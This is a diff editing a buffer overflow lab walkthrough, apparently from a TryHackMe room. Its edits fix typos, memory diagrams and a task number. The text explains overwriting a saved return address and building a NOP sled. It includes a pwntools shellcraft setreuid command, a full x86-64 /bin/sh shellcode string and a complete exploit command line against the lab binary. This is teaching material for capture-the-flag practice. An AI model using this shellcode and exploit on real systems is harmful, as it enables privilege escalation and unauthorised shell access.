@@ -98,7 +98,7 @@ because the chosen breaking point is at the end of the function's instructions. 
 To sum up, our examination of the function's memory shows the following content: 
 
 ```
-\[doggoBBB       (...bunch of zeros...)       \]\[90e3 ffff ff7f 0000\]\[ce05 4000 0000 0000\].
+[doggoBBB        (...bunch of zeros...)           ][90e3 ffff ff7f 0000][ce05 4000 0000 0000].
 ```
 
 If we keep going through the motions of the code presented above, an examination of the instruction pointer at the "mention #1" will reveal that it equalts `0x004005aa`, which is a memory adress that is still within the execution flow of the function. Two instructions later, its value is however equal to `0x004005ce` that is the value that was contained in the function's memory and regurgitated to the main program by the `ret` instruction. All of this happens in the background. Since the memory adress is the one intented by the original programmers, the program flow resumes normally and the binary does what it is supposed to do (display "doggoBBB"). 
@@ -130,7 +130,7 @@ This code goes through the same motions as in the previous section, but this tim
 
 This content means, in turn, the following memory model: 
 ```
-\[doggoAAAA       (...bunch of As...)       \]\[AAAA AAAA AAAA AAAA\]\[BBBB BBBB BBBB 0000\].
+[doggoAAAA         (...bunch of As...)           ][AAAA AAAA AAAA AAAA][BBBB BBBB BBBB 0000].
 ```
 
 This goes to show that by overflowing the function's inputs, we have been able to overwrite the instruction pointer to the value `0x0000BBBBBBBBBBBB`. (It also reveals an offset of 163 bytes). Of course, there is nothing that the program can comprehend at the adress `0x0000BBBBBBBBBBBB`, and so it will crash. If we however refine the idea and present an adress that points to malicious code, we will be well on our way. 
@@ -150,7 +150,7 @@ The general strategy is very well explained in [L1ges write-up](https://l1ge.git
     ```
     $pwn shellcraft -f d amd64.linux.setreuid 1002
     ```
-    (You however need to change **one** alphanumeric character from this command to actually adapt it to task 8). 
+    (You however need to change **one** alphanumeric character from this command to actually adapt it to task 9). 
 - Use the hex code that the command spits to prepend the binary shell code provided in L1ge's write-up. You should get something like:   
    ```
   \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
@@ -164,14 +164,14 @@ There are three important ideas here. First, the total length of the offset must
 ```
 NL + 54 + NR = O
 ```
-Second, the left padding must be filled with `NOPS` instructions (hex code `\x90`). The "no operation' instruction instructs the processor to skip the hex code and move on the next one. Providing the lefft padding with `NOPS` gives us some manoeuver, so that the instruction pointer in memory lands in a region that will push the program towards the execution of the malicous code. If it lands on any `NOPS` instruction, it will be automatically forwarded towards the starting point of the malicious code. 
+Second, the left padding must be filled with `NOPS` instructions (hex code `\x90`). The "no operation' instruction instructs the processor to skip the hex code and move on the next one. Providing the left padding with `NOPS` gives us some manoeuver, so that the instruction pointer in memory lands in a region that will push the program towards the execution of the malicous code. If it lands on any `NOPS` instruction, it will be automatically forwarded towards the starting point of the malicious code. 
 
 Third, the bytes in the right padding part should by any bite that is not corrupted (see [Tib3rius' room](https://tryhackme.com/room/bufferoverflowprep) for a walkthrough). For our practical purpose, the byte `\x41` (the letter A) works fine, but this may not be the case in all situations.
 
-Fourth, there should be padding on both the right and left side, although it is better to put more padding on the left than on the right. There is no exact amount, saved for the cardinal rule that it must respect the total length of the offset (with the malicous code). 
+Fourth, there should be padding on both the right and left side, although it is better to put more padding on the left than on the right. There is no exact amount, saved for the cardinal rule that the total length must equal the offset (with the malicous code). 
 
 ## 4- Choose a memory adress within the left padding
-This will be used to point the instruction pointer towards the malicious code. In practical situations, this could be done by trial and errors (or programmed within the malicious code). Here, we know from the previous sections where the function's memory starts. Consistent with the number of bytes for the left and right padding (numbers not shown), the example below uses "0x7fffffffe272". Then, the following command can be used to perform the exploit: 
+This adress will be used to point the instruction pointer towards the malicious code. In practical situations, this could be done by trial and errors (or programmed within the malicious code). Here, we know from the previous sections where the function's memory starts. Consistent with the number of bytes for the left and right padding (numbers not shown), the example below uses "0x7fffffffe272". Then, the following command can be used to perform the exploit: 
 ```
 ./buffer-overflow-2 $(python -c "print '\x90'*NL+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'  +'A'*NR+ '\x72\xe2\xff\xff\xff\x7f'")
 ```
